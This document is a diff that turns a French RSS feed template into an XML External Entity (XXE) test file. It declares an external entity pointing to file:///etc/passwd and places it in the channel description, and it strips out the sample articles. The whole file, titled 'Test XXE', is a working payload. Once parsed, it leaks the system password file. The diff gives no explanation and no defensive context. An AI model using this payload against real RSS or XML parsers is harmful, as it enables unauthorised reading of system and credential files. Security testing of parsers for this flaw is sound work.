@@ -1,29 +1,12 @@
 <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE rss [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
 <rss version="2.0">
     <channel>
-        <!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'> ]>
-        <root>&xxe;</root>
-        <title>Nom de ton flux RSS</title>
-        <link>https://tonsite.com/</link>
-        <description>Description de ton flux RSS</description>
+        <title>Test XXE</title>
+        <link>https://example.com/</link>
+        <description>&xxe;</description>
         <language>fr</language>
-        <lastBuildDate>Tue, 04 Mar 2025 12:00:00 GMT</lastBuildDate>
-
-        <item>
-            <title>Titre de l'article</title>
-            <link>https://tonsite.com/article-1</link>
-            <description>Résumé de l'article...</description>
-            <pubDate>Tue, 04 Mar 2025 10:00:00 GMT</pubDate>
-            <guid>https://tonsite.com/article-1</guid>
-        </item>
-
-        <item>
-            <title>Un autre article</title>
-            <link>https://tonsite.com/article-2</link>
-            <description>Un autre résumé...</description>
-            <pubDate>Mon, 03 Mar 2025 15:30:00 GMT</pubDate>
-            <guid>https://tonsite.com/article-2</guid>
-        </item>
-
     </channel>
 </rss>
